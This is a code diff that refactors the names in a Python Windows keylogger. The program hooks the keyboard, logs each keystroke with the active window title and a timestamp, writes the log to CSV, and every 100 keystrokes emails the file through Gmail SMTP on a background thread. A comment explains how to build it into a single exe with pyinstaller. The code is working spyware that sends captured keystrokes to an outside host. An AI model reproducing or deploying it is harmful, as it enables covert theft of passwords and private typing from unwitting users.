@@ -26,23 +26,23 @@ from stat import S_IWUSR
 
 # To get this into a exe. use pyinstaller --onefile  -F main23.py
 
-global pathforlogs
-global keystrokecount
-keystrokecount = 0
+global path_for_logs
+global keys_stroke_count
+keys_stroke_count = 0
 
-pathforlogs = os.path.join('LogFolders', 'logs')  # defined globally
+path_for_logs = os.path.join('LogFolders', 'logs')  # defined globally
 
 
 # converts the text file to a table with headers.
 
-def converttotable():
-  datelogname = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.
+def convert_to_table():
+  date_log_name = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.
 
-  if not os.path.exists(pathforlogs):  # if folder for the logs does exist, then create it.
-    os.makedirs(pathforlogs)
+  if not os.path.exists(path_for_logs):  # if folder for the logs does exist, then create it.
+    os.makedirs(path_for_logs)
 
-  location_of_file_and_name_for_logs = os.path.join(pathforlogs, datelogname + "-logfile.txt")
-  location_of_file_and_name_for_logs_table = os.path.join(pathforlogs, datelogname + "-logfile.csv")
+  location_of_file_and_name_for_logs = os.path.join(path_for_logs, date_log_name + "-logfile.txt")
+  location_of_file_and_name_for_logs_table = os.path.join(path_for_logs, date_log_name + "-logfile.csv")
 
   try:   # If file does not exist, then skip the function and keep going(text file will be created in the onkeyboard function).
     f = open(location_of_file_and_name_for_logs, 'r')
@@ -68,173 +68,155 @@ def converttotable():
 
 
 # this will open the file and make the first line start with the timestamp next to it.  Ensures it starts with a datetimestamp on the first line at start.
-def givenewline():
+def give_new_line():
   date_log_name = datetime.today().strftime('%m-%d-%Y')
 
   date_time_stamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')
 
-  if not os.path.exists(pathforlogs):
-    os.makedirs(pathforlogs)
+  if not os.path.exists(path_for_logs):
+    os.makedirs(path_for_logs)
 
-  LocationofFileandName = os.path.join(pathforlogs, date_log_name + "-logfile.txt")
+  location_of_file_and_name = os.path.join(path_for_logs, date_log_name + "-logfile.txt")
   w = win32gui
   current_window = w.GetWindowText(w.GetForegroundWindow())
 
-  logfile = open(LocationofFileandName, 'a+')
+  logfile = open(location_of_file_and_name, 'a+')
 
-  logfile.write(
-    "\n" + date_time_stamp + "|" + current_window + "|" + " ")  # Adds a new line. Enters the current date, time, and current window
+  logfile.write("\n" + date_time_stamp + "|" + current_window + "|" + " ")  # Adds a new line. Enters the current date, time, and current window
   logfile.close()
 
 
 # The main function of the program. It runs whenever a key is pressed.
-def sendfiles():
+def send_files():
 
-    datelogname = datetime.today().strftime('%m-%d-%Y')
-    datelognamestring = str(datelogname)
+    date_log_name = datetime.today().strftime('%m-%d-%Y')
+    date_log_name_string = str(date_log_name)
 
-    emailuser = ""
-    emailpassword = ""
-    emailsend = ''
+    email_user = ""
+    email_password = ""
+    email_send = ''
 
-    subject = ' file' + datelogname
+    subject = ' file' + date_log_name
 
     msg = MIMEMultipart()
-    msg['From'] = emailuser
-    msg['To'] = emailsend
+    msg['From'] = email_user
+    msg['To'] = email_send
     msg['subject'] = subject
 
     body = "Hi there, Here is the log file "
     msg.attach(MIMEText(body, 'plain'))
-    locationofFileandNameForLogsTable = os.path.join(pathforlogs, datelogname + "-logfile.csv")
+    location_of_file_and_name_for_logs_table = os.path.join(path_for_logs, date_log_name + "-logfile.csv")
 
-    filename =  locationofFileandNameForLogsTable
+    filename = location_of_file_and_name_for_logs_table
     attachment = open(filename, 'r')
     part = MIMEBase('application','octet-stream')
     part.set_payload((attachment).read())
     encoders.encode_base64(part)
-    part.add_header('Content-Disposition',"attachment; filename= " +filename)
-
+    part.add_header('Content-Disposition',"attachment; filename= " + filename)
 
     msg.attach(part)
     text = msg.as_string()  # changes the message to a string
 
-
     server = smtplib.SMTP('smtp.gmail.com', 587)  # define the sever to connnect to
     server.starttls()
-    server.login(emailuser, emailpassword)  # the username and password to use
+    server.login(email_user, email_password)  # the username and password to use
 
-    server.sendmail(emailuser, emailsend, text)
+    server.sendmail(email_user, email_send, text)
     server.quit()
 
 
 def OnKeyboardEvent(event):
-  global windowname
+  global window_name
 
   # w = win32gui
   # currentwindow = w.GetWindowText(w.GetForegroundWindow())
 
-  datelogname = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.
-  datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')  # to be used for timestamping the date and the  time the keys were pressed
-
+  date_log_name = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.
+  date_times_stamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')  # to be used for timestamping the date and the  time the keys were pressed
 
   path = os.getcwd()  # gets the current working directory
 
-  if not os.path.exists(pathforlogs):
-    os.makedirs(pathforlogs)
+  if not os.path.exists(path_for_logs):
+    os.makedirs(path_for_logs)
 
   print("The current working directory is %s" % path)
 
-  LocationofFileandName = os.path.join(pathforlogs, datelogname + "-logfile.txt")
-  LocationofFileandNameLockfile = os.path.join(pathforlogs, datelogname + "-logfile.txt.lock")
+  location_of_file_and_name = os.path.join(path_for_logs, date_log_name + "-logfile.txt")
 
-
-  logfile = open(LocationofFileandName, 'a+')  # open the file  in append mode. If the file does not exist, then create the file and open it in append mode.
+  logfile = open(location_of_file_and_name, 'a+')  # open the file  in append mode. If the file does not exist, then create the file and open it in append mode.
   buffers = logfile.read()
 
   logfile.close()
 
   # open the file to write the current new keystrokes.
 
-  logfile = open(LocationofFileandName, 'a+')
+  logfile = open(location_of_file_and_name, 'a+')
 
-  windowname = event.WindowName
-  keylogs = chr(event.Ascii)
+  window_name = event.WindowName
+  key_logs = chr(event.Ascii)
 
   # This code will start a new line if the Current window that the user is using changes to a different window.
-  def NewLineIfWindowChanges():
+  def new_line_if_window_changes():
     w = win32gui
-    currentwindow = w.GetWindowText(w.GetForegroundWindow())
+    current_window = w.GetWindowText(w.GetForegroundWindow())
 
-    datelogname = datetime.today().strftime('%m-%d-%Y')
-    datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')
-    with open(LocationofFileandName, 'r') as fh:
+    date_time_stamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')
+    with open(location_of_file_and_name, 'r') as fh:
 
       data = fh.readlines()
 
       try:
-        lastline = data[-1]
-        print(lastline)
+        last_line = data[-1]
+        print(last_line)
       except IndexError:
         print('The last line has not been written yet, exit function and keep going')
         return
 
-    if str(lastline).find(str(windowname)) != -1:
+    if str(last_line).find(str(window_name)) != -1:
       'print("The window name  has not changed")'
 
     else:
 
-      logfile2 = open(LocationofFileandName, 'a+')
-      logfile2.write("\n" + datetimestamp + "|" + windowname + "|" + " ")
+      logfile2 = open(location_of_file_and_name, 'a+')
+      logfile2.write("\n" + date_time_stamp + "|" + window_name + "|" + " ")
       logfile2.close()
       print("the window has  changed")
 
-
-
   if event.Ascii == 13:  # if entered is pressed, then start a new line, add datetimestamp, windowname and delimter
-    keylogs = '\n' + datetimestamp + "|" + windowname + "|" + " "
+    key_logs = '\n' + date_times_stamp + "|" + window_name + "|" + " "
 
   # if event.Ascii == 8:  # if backspace is used, then convert it to the word, back space. This is done to prevent it from showing up as a box.
-    # keylogs = ' <Backspace> '
+    # key_logs = ' <Backspace> '
 
   if event.Ascii == 8:  # if backspace is used, then convert it to a blank space. This is done to prevent it from showing up as a box.
-    keylogs = ''
+    key_logs = ''
 
   if event.Ascii == 9:
-    keylogs = ' <Tab> '
+    key_logs = ' <Tab> '
 
-  windowid = event.Window
-
-  buffers += keylogs  # Whatever is keylogs equal to, Gets added to the buffers variable.
-  NewLineIfWindowChanges()
-
-
+  buffers += key_logs  # Whatever is keylogs equal to, Gets added to the buffers variable.
+  new_line_if_window_changes()
 
   logfile.write(buffers)  # writes the key pressed  to the file
-  global   keystrokecount  # counter for the number of
+  global keys_stroke_count  # counter for the number of
 
-  keystrokecount += 1 # adds one to the counter each time a
+  keys_stroke_count += 1  # adds one to the counter each time a
 
-  if  keystrokecount == 100:
+  if keys_stroke_count == 100:
     print(" count is equal to 100")
     print("Time to send off the log table to the email")
 
-    keystrokecount = 0
-    #sendfiles()
-    thread = Thread(target=sendfiles)
+    keys_stroke_count = 0
+    # sendfiles()
+    thread = Thread(target=send_files)
     thread.start()
 
-
-
-  print(" count is now ",  keystrokecount) # prints out the  count.
+  print(" count is now ",  keys_stroke_count) # prints out the  count.
 
   logfile.close()  # closes the file
-  converttotable()
+  convert_to_table()
 
   return True
-
-
-
 
 
 def main():
@@ -245,11 +227,11 @@ def main():
 
   pythoncom.PumpMessages()
 
-  givenewline()
-  converttotable()
+  give_new_line()
+  convert_to_table()
 
 
 if __name__ == "__main__":
-  givenewline()
+  give_new_line()
   print("The program has started, Start typing!")
   main()
